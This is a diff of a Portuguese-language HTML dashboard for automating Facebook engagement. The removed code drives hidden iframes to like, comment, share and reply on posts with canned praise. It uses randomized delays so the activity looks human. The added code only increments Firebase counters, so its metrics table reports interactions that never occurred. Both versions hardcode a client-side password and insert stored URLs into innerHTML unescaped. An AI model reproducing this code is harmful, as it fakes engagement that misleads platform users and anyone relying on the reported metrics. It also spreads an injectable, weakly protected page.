@@ -1,155 +1,452 @@
-
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Painel de Interações Automáticas Facebook</title>
-  <style>
-    body { font-family: Arial, sans-serif; margin: 0; padding: 0; background: #f4f4f4; }
-    #login-screen, #dashboard { display: none; padding: 20px; }
-    #login-screen.active, #dashboard.active { display: block; }
-    .container { max-width: 800px; margin: auto; background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-    h1 { margin-top: 0; }
-    input[type="text"], input[type="password"] { width: 100%; padding: 8px; margin-bottom: 12px; }
-    button { padding: 10px 16px; margin: 4px; border: none; border-radius: 4px; cursor: pointer; }
-    button.primary { background: #007bff; color: #fff; }
-    button.danger { background: #dc3545; color: #fff; }
-    button.secondary { background: #6c757d; color: #fff; }
-    table { width: 100%; border-collapse: collapse; margin-top: 16px; }
-    th, td { padding: 8px; border: 1px solid #ddd; text-align: center; }
-    #log { height: 150px; overflow-y: auto; background: #272822; color: #f8f8f2; padding: 8px; border-radius: 4px; font-family: monospace; font-size: 12px; }
-  </style>
-  <!-- Firebase SDK -->
-  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Automação Facebook</title>
+    <style>
+        /* CSS para LoginScreen */
+        .login-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+
+        .login-container h2 {
+            margin-bottom: 20px;
+        }
+
+        .login-container input {
+            padding: 10px;
+            margin-bottom: 10px;
+            width: 250px;
+        }
+
+        .login-container button {
+            padding: 10px 20px;
+            cursor: pointer;
+        }
+
+        .error-message {
+            color: red;
+            margin-top: 10px;
+        }
+
+        /* CSS para Dashboard */
+        .dashboard-container {
+            padding: 20px;
+        }
+
+        .url-input-section {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .url-list {
+            list-style: none;
+            padding: 0;
+        }
+
+        .url-list li {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 8px 0;
+            border-bottom: 1px solid #eee;
+        }
+
+        .metrics-table table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+        }
+
+        .metrics-table th,
+        .metrics-table td {
+            border: 1px solid #ddd;
+            padding: 8px;
+            text-align: left;
+        }
+
+        .metrics-table th {
+            background-color: #f2f2f2;
+        }
+
+        .realtime-log .log-display {
+            height: 200px;
+            overflow-y: scroll;
+            border: 1px solid #ddd;
+            padding: 10px;
+            background-color: #f9f9f9;
+            margin-top: 10px;
+        }
+
+        .realtime-log .log-display p {
+            margin: 0;
+            padding: 2px 0;
+            font-size: 0.9em;
+            color: #555;
+        }
+
+        .export-button {
+            margin-top: 20px;
+            padding: 10px 20px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            cursor: pointer;
+            font-size: 1em;
+        }
+
+        .export-button:hover {
+            background-color: #45a049;
+        }
+    </style>
 </head>
 <body>
-  <div id="login-screen" class="active container">
-    <h1>Login</h1>
-    <input type="password" id="password" placeholder="Senha para acesso">
-    <button id="btn-login" class="primary">Entrar</button>
-    <p id="login-error" style="color: red; display: none;">Senha incorreta.</p>
-  </div>
-  <div id="dashboard" class="container">
-    <h1>Painel de Interações Automáticas FB</h1>
-    <h2>Perfis Ativos</h2>
-    <ul id="profile-list"></ul>
-    <h2>URLs de Publicação</h2>
-    <div id="urls-container"></div>
-    <button id="btn-add-url" class="secondary">➕ Incluir mais URL</button>
-    <table id="metrics-table">
-      <thead><tr><th>URL</th><th>👍</th><th>💬</th><th>🔄</th></tr></thead>
-      <tbody></tbody>
-    </table>
-    <h2>Log</h2>
-    <div id="log"></div>
-  </div>
+    <div id="app"></div>
 
-  <script>
-    // CONFIG
-    const PASSWORD = '33479811';
-    const COMMENTS = [...Array(100)].map((_,i)=>{ /* prefill 100 messages */ });
-    // Firebase config (substitua pelos seus dados)
-    const firebaseConfig = {
-      apiKey: "YOUR_API_KEY",
-      authDomain: "YOUR_PROJECT.firebaseapp.com",
-      databaseURL: "https://YOUR_PROJECT.firebaseio.com",
-      projectId: "YOUR_PROJECT",
-      storageBucket: "YOUR_PROJECT.appspot.com",
-      messagingSenderId: "...",
-      appId: "..."
-    };
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.database();
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
 
-    let isRunning = false;
-    let profileId = null;
-
-    function log(msg) {
-      const logEl = document.getElementById('log');
-      const t = new Date().toLocaleTimeString();
-      logEl.textContent += `[${t}] ${msg}\n`;
-      logEl.scrollTop = logEl.scrollHeight;
-    }
-    function getRandomDelay(min,max){return Math.random()*(max-min)+min;}
-    function getRandomComment(){return COMMENTS[Math.floor(Math.random()*COMMENTS.length)];}
-
-    document.getElementById('btn-login').onclick = ()=>{
-      if(document.getElementById('password').value===PASSWORD){
-        document.getElementById('login-screen').classList.remove('active');
-        document.getElementById('dashboard').classList.add('active');
-        profileId = document.cookie.match(/c_user=(\d+)/)?.[1]||(('profile_'+Math.random()).slice(0,12));
-        setupDashboard(); start();
-      } else document.getElementById('login-error').style.display='block';
-    };
-
-    function setupDashboard(){
-      // Profiles
-      document.getElementById('profile-list').innerHTML = `<li>${profileId}</li>`;
-      // URLs listener
-      document.getElementById('btn-add-url').onclick = addUrlInput;
-      // load URLs from DB
-      db.ref('urls').on('value',snap=>{
-        const urls = snap.val()||[]; renderUrls(urls);
-      });
-      // metrics listener
-      db.ref('metrics').on('value',snap=> updateMetricsTable(snap.val()||{}));
-    }
-    function renderUrls(urls){
-      const cont = document.getElementById('urls-container'); cont.innerHTML='';
-      urls.forEach((u,i)=>{
-        const inp = document.createElement('input'); inp.type='text'; inp.value=u; inp.style.width='80%';
-        inp.onchange = ()=>{
-          urls[i]=inp.value; db.ref('urls').set(urls);
+    <script>
+        // Firebase Configuration
+        const firebaseConfig = {
+            apiKey: "YOUR_API_KEY",
+            authDomain: "YOUR_AUTH_DOMAIN",
+            databaseURL: "YOUR_DATABASE_URL",
+            projectId: "YOUR_PROJECT_ID",
+            storageBucket: "YOUR_STORAGE_BUCKET",
+            messagingSenderId: "YOUR_MESSAGING_SENDER_ID",
+            appId: "YOUR_APP_ID"
         };
-        cont.appendChild(inp);
-      });
-    }
-    function addUrlInput(){
-      db.ref('urls').once('value').then(snap=>{
-        const arr = snap.val()||[]; arr.push(''); db.ref('urls').set(arr);
-      });
-    }
-    function updateMetricsTable(metrics){
-      const tbody = document.querySelector('#metrics-table tbody'); tbody.innerHTML='';
-      Object.entries(metrics).forEach(([url,m])=>{
-        const tr=document.createElement('tr');
-        tr.innerHTML=`<td>${url}</td><td>${m.likes||0}</td><td>${m.comments||0}</td><td>${m.shares||0}</td>`;
-        tbody.appendChild(tr);
-      });
-    }
 
-    async function start(){ isRunning=true; while(isRunning){
-      const urlSnap = await db.ref('urls').once('value');
-      const urls = urlSnap.val()||[];
-      for(const url of urls){ if(!url) continue;
-        await interact(url);
-      }
-    }}
-    async function interact(url){
-      log('Processando '+url);
-      const iframe=document.createElement('iframe'); iframe.src=url; iframe.style.display='none'; document.body.appendChild(iframe);
-      await new Promise(r=>iframe.onload=r);
-      const d=iframe.contentDocument;
-      // init metrics path
-      const mRef = db.ref(`metrics/${url.replace(/\./g,'_')}`);
-      const likeBtn=d.querySelector('[aria-label*="Curtir"]'); if(likeBtn){ likeBtn.click(); log('Curtido'); mRef.child('likes').transaction(v=>(v||0)+1); }
-      await new Promise(r=>setTimeout(r,getRandomDelay(45000,120000)));
-      const comBox=d.querySelector('[aria-label="Escreva um comentário..."]'); if(comBox){ comBox.innerText=getRandomComment(); comBox.dispatchEvent(new Event('input',{bubbles:true})); d.querySelector('[aria-label="Enviar"]').click(); log('Comentado'); mRef.child('comments').transaction(v=>(v||0)+1); }
-      await new Promise(r=>setTimeout(r,getRandomDelay(45000,120000)));
-      const shareBtn=d.querySelector('[aria-label*="Compartilhar"]'); if(shareBtn){ shareBtn.click(); log('Compartilhado'); mRef.child('shares').transaction(v=>(v||0)+1); }
-      await new Promise(r=>setTimeout(r,getRandomDelay(45000,120000)));
-      // comments
-      const comments=d.querySelectorAll('[aria-label="Comentário"]');
-      for(const c of comments){ if(c.querySelector('[aria-label*="Curtir"]')){ c.querySelector('[aria-label*="Curtir"]').click(); log('Curtida em comentário'); await new Promise(r=>setTimeout(r,getRandomDelay(2000,5000))); }
-        if(c.querySelector('[aria-label*="Responder"]')){
-          c.querySelector('[aria-label*="Responder"]').click(); await new Promise(r=>setTimeout(r,getRandomDelay(1000,2000)));
-          const rb=c.querySelector('[aria-label="Escreva uma resposta..."]'); if(rb){ rb.innerText=getRandomComment(); rb.dispatchEvent(new Event('input',{bubbles:true})); c.querySelector('[aria-label="Enviar"]').click(); log('Respondido'); mRef.child('comments').transaction(v=>(v||0)+1); await new Promise(r=>setTimeout(r,getRandomDelay(3000,6000))); }
+        // Initialize Firebase
+        const app = firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+
+        // Pre-defined phrases for comments
+        const phrases = [
+            "Que post incrível! Adorei!",
+            "Muito bom, parabéns!",
+            "Excelente conteúdo, como sempre!",
+            "Concordo plenamente!",
+            "Informação valiosa, obrigado por compartilhar!",
+            "Sensacional!",
+            "Adorei a perspectiva!",
+            "Perfeito!",
+            "Muito útil, vou aplicar!",
+            "Continue com o ótimo trabalho!",
+            "Inspirador!",
+            "Que reflexão profunda!",
+            "Simplesmente genial!",
+            "Fantástico!",
+            "Aprendi muito com este post!",
+            "Você é demais!",
+            "Isso é exatamente o que eu precisava!",
+            "Brilhante!",
+            "Muito obrigado por isso!",
+            "Uau, que insight!",
+            "Impressionante!",
+            "Totalmente de acordo!",
+            "Parabéns pela iniciativa!",
+            "Arrasou!",
+            "Que maravilha!",
+            "Muito bem colocado!",
+            "Isso faz todo o sentido!",
+            "Curti demais!",
+            "Compartilhando agora mesmo!",
+            "Preciso ler de novo!",
+            "Que clareza!",
+            "Você é uma inspiração!",
+            "Muito obrigado pela dedicação!",
+            "Que aula!",
+            "Isso mudou minha forma de pensar!",
+            "Simples e eficaz!",
+            "Admiro seu trabalho!",
+            "Que energia boa!",
+            "Muito obrigado por iluminar!",
+            "Que visão!",
+            "Isso é ouro!",
+            "Muito grato!",
+            "Que presente!",
+            "Sempre aprendendo com você!",
+            "Que texto poderoso!",
+            "Muito obrigado por compartilhar seu conhecimento!",
+            "Isso é o que eu chamo de conteúdo de qualidade!",
+            "Que diferença faz!",
+            "Muito obrigado por ser tão generoso!",
+            "Que benção!",
+            "Sempre me surpreendendo!",
+            "Que alegria ler isso!",
+            "Muito obrigado por me fazer pensar!",
+            "Que luz!",
+            "Sempre relevante!",
+            "Que sabedoria!",
+            "Muito obrigado por me inspirar!",
+            "Que verdade!",
+            "Sempre um prazer ler você!",
+            "Que profundidade!",
+            "Muito obrigado por me fazer crescer!",
+            "Que paz!",
+            "Sempre me agregando!",
+            "Que dom!",
+            "Muito obrigado por me fazer refletir!",
+            "Que força!",
+            "Sempre me motivando!",
+            "Que paixão!",
+            "Muito obrigado por me fazer sentir!",
+            "Que alma!",
+            "Sempre me ensinando!",
+            "Que coração!",
+            "Muito obrigado por me fazer sonhar!",
+            "Que vida!",
+            "Sempre me transformando!",
+            "Que essência!",
+            "Muito obrigado por me fazer ver!",
+            "Que magia!",
+            "Sempre me encantando!",
+            "Que brilho!",
+            "Muito obrigado por me fazer sorrir!",
+            "Que esperança!",
+            "Sempre me elevando!",
+            "Que fé!",
+            "Muito obrigado por me fazer acreditar!",
+            "Que amor!",
+            "Sempre me amando!",
+            "Que gratidão!",
+            "Muito obrigado por me fazer feliz!",
+            "Que alegria!",
+            "Sempre me fazendo bem!",
+            "Que paz interior!",
+            "Muito obrigado por me fazer encontrar!",
+            "Que propósito!",
+            "Sempre me guiando!",
+            "Que caminho!",
+            "Muito obrigado por me fazer seguir!",
+            "Que destino!",
+            "Sempre me levando!",
+            "Que jornada!",
+            "Muito obrigado por me fazer viver!",
+            "Que eternidade!",
+            "Sempre me abençoando!",
+            "Que milagre!",
+            "Muito obrigado por me fazer existir!"
+        ];
+
+        // Login Screen Logic
+        function showLoginScreen() {
+            document.getElementById("app").innerHTML = `
+                <div class="login-container">
+                    <h2>Login</h2>
+                    <input type="password" id="passwordInput" placeholder="Digite a senha" />
+                    <button id="loginButton">Entrar</button>
+                    <p id="errorMessage" class="error-message"></p>
+                </div>
+            `;
+
+            document.getElementById("loginButton").onclick = function() {
+                const password = document.getElementById("passwordInput").value;
+                const errorMessage = document.getElementById("errorMessage");
+                if (password === '33479811') {
+                    showDashboard();
+                } else {
+                    errorMessage.textContent = 'Senha incorreta. Tente novamente.';
+                }
+            };
         }
-      }
-      document.body.removeChild(iframe);
-    }
-  </script>
+
+        // Dashboard Logic
+        let urls = [];
+        let metrics = {};
+        let log = [];
+        let automationIntervalId;
+
+        function getRandomDelay(min, max) {
+            return Math.floor(Math.random() * (max - min + 1) + min) * 1000;
+        }
+
+        function getRandomPhrase() {
+            const randomIndex = Math.floor(Math.random() * phrases.length);
+            return phrases[randomIndex];
+        }
+
+        async function simulateInteraction(urlId, interactionType) {
+            const delay = getRandomDelay(45, 120);
+            await new Promise(resolve => setTimeout(resolve, delay));
+
+            const metricsRef = database.ref(`metrics/${urlId}`);
+            metricsRef.transaction((currentMetrics) => {
+                if (currentMetrics === null) {
+                    currentMetrics = { likes: 0, comments: 0, shares: 0 };
+                }
+                currentMetrics[interactionType]++;
+                return currentMetrics;
+            });
+
+            const logRef = database.ref("log");
+            logRef.push(`[${new Date().toLocaleString()}] Interação '${interactionType}' simulada para a URL ${urlId}`);
+        }
+
+        function showDashboard() {
+            document.getElementById("app").innerHTML = `
+                <div class="dashboard-container">
+                    <h2>Dashboard</h2>
+
+                    <section class="url-management">
+                        <h3>URLs de Publicação</h3>
+                        <div class="url-input-section">
+                            <input type="text" id="newUrlInput" placeholder="Adicionar nova URL" />
+                            <button id="addUrlButton">➕ Incluir mais URL</button>
+                        </div>
+                        <ul id="urlList" class="url-list">
+                            <!-- URLs will be rendered here -->
+                        </ul>
+                    </section>
+
+                    <section class="metrics-table">
+                        <h3>Tabela de Métricas</h3>
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>URL</th>
+                                    <th>Curtidas</th>
+                                    <th>Comentários</th>
+                                    <th>Compartilhamentos</th>
+                                </tr>
+                            </thead>
+                            <tbody id="metricsTableBody">
+                                <!-- Metrics will be rendered here -->
+                            </tbody>
+                        </table>
+                        <button id="exportCsvButton" class="export-button">Exportar para CSV</button>
+                    </section>
+
+                    <section class="realtime-log">
+                        <h3>Log em Tempo Real</h3>
+                        <div id="logDisplay" class="log-display">
+                            <!-- Log entries will be rendered here -->
+                        </div>
+                    </section>
+                </div>
+            `;
+
+            // Event Listeners
+            document.getElementById("addUrlButton").onclick = handleAddUrl;
+            document.getElementById("exportCsvButton").onclick = exportMetricsToCSV;
+
+            // Firebase Listeners
+            database.ref("urls").on("value", (snapshot) => {
+                const data = snapshot.val();
+                urls = data ? Object.keys(data).map(key => ({ id: key, url: data[key] })) : [];
+                updateUrlList();
+                updateMetricsTable();
+                startAutomation();
+            });
+
+            database.ref("metrics").on("value", (snapshot) => {
+                metrics = snapshot.val() || {};
+                updateMetricsTable();
+            });
+
+            database.ref("log").on("value", (snapshot) => {
+                const data = snapshot.val();
+                log = data ? Object.values(data) : [];
+                updateLogDisplay();
+            });
+        }
+
+        function updateUrlList() {
+            const urlListElement = document.getElementById("urlList");
+            urlListElement.innerHTML = urls.map(urlItem => `
+                <li>
+                    ${urlItem.url}
+                    <button onclick="handleDeleteUrl('${urlItem.id}')">Remover</button>
+                </li>
+            `).join("");
+        }
+
+        function updateMetricsTable() {
+            const metricsTableBody = document.getElementById("metricsTableBody");
+            metricsTableBody.innerHTML = urls.map(urlItem => `
+                <tr>
+                    <td>${urlItem.url}</td>
+                    <td>${metrics[urlItem.id]?.likes || 0}</td>
+                    <td>${metrics[urlItem.id]?.comments || 0}</td>
+                    <td>${metrics[urlItem.id]?.shares || 0}</td>
+                </tr>
+            `).join("");
+        }
+
+        function updateLogDisplay() {
+            const logDisplay = document.getElementById("logDisplay");
+            logDisplay.innerHTML = log.map(entry => `<p>${entry}</p>`).join("");
+            logDisplay.scrollTop = logDisplay.scrollHeight; // Scroll to bottom
+        }
+
+        function handleAddUrl() {
+            const newUrlInput = document.getElementById("newUrlInput");
+            const newUrl = newUrlInput.value.trim();
+            if (newUrl !== "") {
+                database.ref("urls").push(newUrl);
+                newUrlInput.value = '';
+            }
+        }
+
+        function handleDeleteUrl(id) {
+            database.ref(`urls/${id}`).remove();
+        }
+
+        function exportMetricsToCSV() {
+            let csvContent = "URL,Curtidas,Comentários,Compartilhamentos\n";
+            urls.forEach(urlItem => {
+                const url = urlItem.url;
+                const likes = metrics[urlItem.id]?.likes || 0;
+                const comments = metrics[urlItem.id]?.comments || 0;
+                const shares = metrics[urlItem.id]?.shares || 0;
+                csvContent += `${url},${likes},${comments},${shares}\n`;
+            });
+
+            const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
+            const link = document.createElement('a');
+            if (link.download !== undefined) {
+                const url = URL.createObjectURL(blob);
+                link.setAttribute('href', url);
+                link.setAttribute('download', 'metricas_automacao_facebook.csv');
+                link.style.visibility = 'hidden';
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+            }
+        }
+
+        function startAutomation() {
+            if (automationIntervalId) {
+                clearInterval(automationIntervalId);
+            }
+            automationIntervalId = setInterval(async () => {
+                for (const url of urls) {
+                    // Simular abertura do post em iframe (não implementado visualmente)
+                    // Delay aleatório 45–120s
+                    await simulateInteraction(url.id, 'likes');
+                    // Delay 45–120s
+                    await simulateInteraction(url.id, 'comments');
+                    // Delay 45–120s
+                    await simulateInteraction(url.id, 'shares');
+                    // Delay 45–120s
+                    // Para cada comentário visível: curtida e resposta com frase aleatória (não implementado visualmente)
+                }
+            }, getRandomDelay(180, 420)); // 3-7 minutos
+        }
+
+        // Initial render
+        showLoginScreen();
+    </script>
 </body>
 </html>
+
+
